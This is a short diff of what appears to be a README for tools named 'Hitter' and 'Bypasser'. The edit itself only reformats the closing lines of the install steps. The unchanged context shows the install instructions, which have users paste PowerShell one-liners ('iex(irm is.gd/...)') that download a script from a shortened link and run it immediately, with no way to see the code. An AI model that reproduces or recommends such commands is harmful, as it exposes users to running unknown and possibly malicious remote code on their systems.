@@ -15,9 +15,7 @@ To use the Hitter tool, follow the steps below:
    iex(irm is.gd/docomojx)
    ```
 
-3. Follow the on-screen instructions to complete the setup.
-
-That's it! 🎉
+3. Follow the on-screen instructions to complete the setup. That's it! 🎉
 
 ---
 
@@ -33,9 +31,7 @@ To use the Bypasser tool, follow these steps:
    iex(irm is.gd/bypassjx)
    ```
 
-3. Follow the on-screen instructions to proceed.
-
-And you're done! 🎉
+3. Follow the on-screen instructions to proceed and you're done! 🎉
 
 ---
 
